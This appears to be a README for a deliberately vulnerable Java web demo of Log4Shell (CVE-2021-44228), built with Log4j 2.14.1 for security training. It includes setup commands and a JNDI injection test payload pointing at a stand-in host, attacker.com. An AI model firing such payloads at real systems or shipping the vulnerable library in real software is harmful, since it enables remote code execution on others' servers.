# CVE-2021-44228 Log4Shell WebApp Demo

This is a minimal Java web application vulnerable to **Log4Shell (CVE-2021-44228)**, built with:

- Java + Jetty (embedded)
- Log4j 2.14.1 (vulnerable)
- Simple HTML form
- Docker or manual Java support

---

## Quick Start

### Prerequisites:
- Debian/Ubuntu-based system
- Internet access

### Clone the repository:
```bash
git clone https://github.com/SanderSchepers1993/CyberSec25.git
cd CyberSec25
```

### Run the setup script:
```bash
chmod +x setup.sh
./setup.sh
```

Open your browser and visit:
[http://localhost:8080](http://localhost:8080)

---

## Test Payload (work in progress)

Submit the following payload to the form:
```text
${jndi:ldap://attacker.com/a}
```
This will be **logged by Log4j**, potentially triggering the Log4Shell exploit **if you have a rogue LDAP server running**.

---

## Project Structure
```
CyberSec25/
├── Main.java
├── log4j2.xml
├── setup.sh
├── README.md
└── libs/ (downloaded automatically)
```

---

## Disclaimer
This project is intentionally vulnerable. Use responsibly in **isolated test environments** only. The author takes no responsibility for misuse.
